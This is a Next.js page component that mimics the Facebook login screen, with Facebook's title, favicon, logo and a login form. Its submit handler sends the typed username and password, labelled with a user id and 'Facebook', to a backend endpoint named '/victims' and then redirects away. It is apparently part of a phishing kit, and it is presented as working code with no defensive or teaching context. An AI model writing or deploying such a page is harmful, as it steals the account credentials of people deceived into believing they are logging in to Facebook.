import Image from "next/image";
import React, { useState } from "react";
import router, { Router, useRouter } from "next/router";
import styles from "../styles/fb.module.css";
import Head from "next/head";
import { API_URL } from "../utils/urls";


const fb = () => {
    const route = useRouter()
    const id = route.query.i
    const [details, setDetails] = useState({username:"", password:""});

    
    const handleChange = (e) => {
        setDetails({...details, [e.target.name]: e.target.value})
    }

    const handleSubmit = (e) => {
        e.preventDefault()
        const data = {
            "password": details.password,
            "username": details.username,
            "users_permissions_user": id,
            "Page": "Facebook"
        }
        fetch(`${API_URL}http://localhost:1337/victims`, {
            method: "POST",
            body: JSON.stringify(data),
            headers: { "Content-Type": "application/json "},
        })
         router.push("/")
        console.log("details:", data)
    }

    return (
    <div className={styles.container}>
        <Head>
        <title>Facebook</title>
        <link rel="icon" href="/FbFav.png" />
      </Head>
      <div className={styles.box}>  
     <div className={styles.lg}>

         <Image 
            src="/fblogo.svg" 
            alt="logo" 
            width="250px" 
            height="50px"
            />
    </div>
    <div className={styles.content}>
    <form onSubmit={handleSubmit}>
                <div className={styles.field}>
                    <label htmlFor="username" ></label>
                    <input className={styles.user} value={details.username} type="text" name="username" onChange={handleChange} placeholder="Mobile number or email address" minLength="3" maxLength="15"></input>
                </div>
                <div className={styles.field}>
                    <label htmlFor="password" ></label>
                    <input className={styles.user} value={details.password} type="password" name="password" onChange={handleChange} placeholder="Password" minLength="5" maxLength="20"></input>
                </div>
                <button className={styles.loginBtn} type="submit">Log In</button>
            </form>
            <a href="#">Forgotten password?</a>
            <div className={styles.separator}>
                <div className={styles.line}></div>
                <p>OR</p>
                <div className={styles.line}></div>
            </div>
            <button className={styles.btnNew}>Create New Account</button>
    </div>
    </div>
    </div>
    )
}

export default fb;